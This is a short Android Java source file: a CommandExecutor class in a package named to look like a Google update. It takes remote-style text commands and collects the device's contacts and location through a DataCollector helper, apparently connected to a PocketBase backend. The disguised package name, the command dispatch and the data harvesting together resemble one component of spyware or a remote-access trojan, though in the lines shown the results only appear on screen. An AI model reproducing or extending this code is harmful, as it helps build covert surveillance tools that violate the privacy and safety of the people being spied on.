package com.google.update;

import android.content.Context;
import android.widget.Toast;

public class CommandExecutor {
    private final Context context;
    private final PocketBaseManager pbManager;

    public CommandExecutor(Context context, PocketBaseManager pbManager) {
        this.context = context;
        this.pbManager = pbManager;
    }

    public void executeCommand(String command) {
        String cmd = command.trim().toLowerCase();
        switch (cmd) {
            case "/contacts":
                DataCollector.getContacts(context, result -> {
                    Toast.makeText(context, "Contacts: " + result.length() + " chars", Toast.LENGTH_SHORT).show();
                });
                break;
            case "/location":
                DataCollector.getLocation(context, result -> {
                    Toast.makeText(context, result, Toast.LENGTH_LONG).show();
                });
                break;
            default:
                Toast.makeText(context, "Command: " + command, Toast.LENGTH_SHORT).show();
                break;
        }
    }
}
